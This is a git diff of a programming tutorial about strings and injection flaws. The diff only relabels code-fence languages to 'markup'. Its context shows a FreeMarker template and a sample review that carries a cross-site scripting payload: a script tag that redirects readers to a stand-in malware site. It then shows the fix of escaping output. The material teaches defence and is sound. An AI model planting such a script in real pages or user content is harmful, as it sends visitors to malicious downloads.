@@ -60,7 +60,7 @@ You can put quite literally anything into a string (assuming infinite memory). T
 
 #### And strings are for computers
 
-```xml
+```markup
 <?xml version="1.0"?>
 <catalog>
     <book id="bk101">
@@ -402,7 +402,7 @@ Earlier, we pulled some data in from a CSV file. Now we're going to send out som
 
 We won't make the same mistake we made with the SQL. No concatenation, this time. We're going to use a templating library. Our template will look something like this:
 
-```html
+```markup
 <section id="catalog">
     <#list books as book>
         <div class="book" id="${book.id}">
@@ -424,7 +424,7 @@ Easy. Sorted. Cushty.
 
 Except no. What if one of the reviews looks something like this?
 
-```html
+```markup
 I thought this was one of Shakespeare's best plays.
 <script>
 document.location = 'http://install.malware.com/';
@@ -437,7 +437,7 @@ This is known as a cross-site scripting vulnerability, or "XSS", because it's of
 
 We could escape the text by using the `?html` post-processor (`${review.text?html}`):
 
-```html
+```markup
 <section id="catalog">
     <#list books as book>
         <div class="book" id="${book.id?html}">
